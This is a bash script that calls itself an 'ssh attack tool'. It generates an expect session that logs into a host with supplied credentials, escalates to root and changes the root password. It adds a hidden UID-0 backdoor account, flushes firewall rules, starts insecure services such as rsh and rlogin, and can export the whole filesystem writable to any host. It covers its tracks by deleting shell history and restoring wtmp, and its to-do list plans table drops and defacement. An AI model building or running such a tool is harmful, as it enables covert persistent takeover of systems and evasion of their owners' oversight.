#!/usr/bin/env bash
#evil ssh; ssh attack tool
# TO DO
# drop all mysql stuff option
# deface website option
# mount remote share

if [ "$1" = "-h" -o "$1" = "--help" ]; then
	echo "Usage: $0 [user@host]|[user@host:port] [password] [options]"
	echo "Example: $0 root@1.2.3.4 toor"
	echo "Example: $0 root@1.2.3.4:2222 toor"
	exit 0
fi

#variables - can be changed to meet different needs
expectFile="connect.exp"
errorFile=".evil_ssh.log"
serviceStop="iptables ipfw ipf pf"
serviceStart="xinetd inetd ssh sshd cron crond anacron cups portmap nfs nfslock rpcbind rpcidmapd smb smbd samba rsync rsh rlogin ftp"
doServices="yes"
newUser="sysd"
newUserID="0"
newRootPass="Password!"
newPass="Password!"
dropTables="no"
defaceSite="no"
shareRoot="no"
alterLastHistory="no"

if [ $# -gt 0 ]; then
	firstArg=`echo $1 | /usr/bin/env awk -F":" '{print $1}'`
	port=`echo $1 | /usr/bin/env awk -F":" '{print $2}'`
	if [ ${#2} -lt 1 ]; then
		read -p "Enter password: " pass
	else
		pass=$2
	fi
	user=`echo $firstArg | /usr/bin/env awk -F"@" '{print $1}'`
else
	echo "Values can also be given as command line arguments."
	read -p "Enter host: " host
	read -p "Enter username: " user
	read -p "Enter password: " pass
	read -p "Enter port: " port
	firstArg="$user@$host"
fi

if [ ${#port} -lt 1 ]; then #if no port given, make default 22
		port=22
fi

echo "#!/usr/bin/expect" > $expectFile #write shebang to file

if [ "$alterLastHistory" == "yes" ]; then #if want to alter last history to cover tracks of logging in, write this to file
	/bin/cat <<SCP >> $expectFile
spawn scp -P $port $firstArg:/var/log/wtmp ./evil_ssh_wtmp_backup
expect yes/no { send yes\r; exp_continue}
expect "*assword*"
send "$pass\r"
expect "100%"
sleep 1
spawn scp -P $port ./evil_ssh_wtmp_backup $firstArg:/var/log/wtmp.bak
expect "*assword*"
send "$pass\r"
expect "100%"
sleep 1
SCP
fi

/bin/cat <<LOGIN >> $expectFile
spawn ssh -p $port $firstArg
expect yes/no { send yes\r; exp_continue}
set prompt ":|#|\\\\\\$"
interact -o -nobuffer -re \$prompt return
send "$pass\r"
LOGIN

if [ "$user" != "root" ]; then #if not root, sudo su to root and send password to be successful
	echo "interact -o -nobuffer -re \$prompt return" >> $expectFile
	echo "send \"history -d \`history | wc -l\`; sudo su\r\"" >> $expectFile
	echo "expect \"*assword*\" { send $pass\r; exp_continue}" >> $expectFile
fi

/bin/cat<<MORE >> $expectFile
interact -o -nobuffer -re \$prompt return
send "history -d \`history | wc -l\`; /bin/sh\r"
interact -o -nobuffer -re \$prompt return
send "echo -e '$newRootPass\\\n$newRootPass' | passwd root\r"
interact -o -nobuffer -re \$prompt return
send "useradd -g root -M -o -u $newUserID $newUser\r"
interact -o -nobuffer -re \$prompt return
send "usermod -a -G sudo $newUser\r"
interact -o -nobuffer -re \$prompt return
send "usermod -a -G wheel $newUser\r"
interact -o -nobuffer -re \$prompt return
send "usermod -a -G adm $newUser\r"
interact -o -nobuffer -re \$prompt return
send "pwck -s\r"
interact -o -nobuffer -re \$prompt return
send "echo -e '$newPass\\\n$newPass' | passwd $newUser\r"
interact -o -nobuffer -re \$prompt return
send "/usr/bin/env iptables -F || ipfw flush\r"
MORE

if [ "$dropTables" == "yes" ]; then
	echo "Dropping all MySQL tables functionality not yet implemented"
fi

if [ "$defaceSite" == "yes" ]; then
	echo "Defacing website functionality not yet implemented"
fi

#start certain services
if [ "$doServices" == "yes" ]; then
	for service in $serviceStart; do
		echo "interact -o -nobuffer -re \$prompt return" >> $expectFile
		echo "send \"/usr/bin/env service $service start\r\" " >> $expectFile
	done

	#stop certain services
	for service in $serviceStop; do
		echo "interact -o -nobuffer -re \$prompt return" >> $expectFile
		echo "send \"/usr/bin/env service $service stop\r\" " >> $expectFile
	done
fi

if [ "$shareRoot" == "yes" ]; then
	echo "Mounting remote share functionality not yet implemented"
	echo "interact -o -nobuffer -re \$prompt return" >> $expectFile
	echo "send \"echo \"/ *.*.*.*(rw,no_root_squash)\" >> /etc/exports\r\" " >> $expectFile
	echo "interact -o -nobuffer -re \$prompt return" >> $expectFile
	echo "send \"echo -e \"ALL:ALL\n\n\" >> /etc/hosts.allow\r\" " >> $expectFile
fi

if [ "$alterLastHistory" == "yes" ]; then
	echo "interact -o -nobuffer -re \$prompt return" >> $expectFile
	echo "send \"mv /var/log/wtmp.bak /var/log/wtmp\r\"" >> $expectFile
fi

/bin/cat <<BOTTOM >> $expectFile
interact -o -nobuffer -re \$prompt return
send "history -c; exit\r"
interact -o -nobuffer -re \$prompt return
send "history -d \`history | wc -l\`; exit\r"
interact -o -nobuffer -re \$prompt return
send "history -d \`history | wc -l\`; exit\r"
interact
BOTTOM

echo "Attempting login..."
# /usr/bin/expect myfile.exp
echo "Completed."

